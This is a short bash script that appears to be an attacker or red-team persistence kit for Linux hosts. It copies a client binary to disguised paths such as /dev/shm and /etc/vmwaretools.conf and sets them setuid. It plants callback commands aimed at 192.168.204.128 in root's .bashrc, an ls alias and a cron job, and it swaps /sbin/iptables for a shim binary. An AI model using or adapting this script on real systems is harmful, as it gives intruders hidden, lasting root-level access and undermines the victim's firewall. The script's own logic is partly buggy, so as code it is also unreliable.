#!/bin/bash

# Change payload's ip:port before deployment
payload1="/dev/shm/pulse-shm-10175238 192.168.204.128 53" 
payload2="/dev/loop17 192.168.204.128 80"
payload3="/etc/vmware-tools.conf 192.168.204.128 8080"

# Setup tools for basic deployment 
setup(){
    #yum install -y 
    apt-get install -y curl wget vim python3
}

# Timestomp 

# Clone the client binary into different places 
clone(){
    cp deploy.sh /dev/shm/pulse-shm-10175238
    cp deploy.sh /dev/loop28
    cp deploy.sh /etc/vmware-tools.conf 

    cp client /dev/shm/pulse-shm-401862937
    cp client /dev/loop17
    cp client /etc/vmwaretools.conf
    chmod u+s /dev/shm/pulse-shm-401862937 /dev/loop17 /etc/vmwaretools.conf
}

bashrc(){
    sed -i '30 a $payload1' /root/.bashrc
}

# Need persistent alias 
alias_ls(){
    alias ls="ls; $payload2"
}

cronjob(){
    crontab -l | { cat; echo "$payload3"; } | crontab -
}

# Shim binaries
shim(){
    mv /sbin/iptables /var/cache/cached_iptables
    gcc ./iptables/drop.c -o ./iptables/drop
    mv ./iptables/drop /bin/fw
    mv ./iptables/iptables.sh /sbin/iptables
}

shim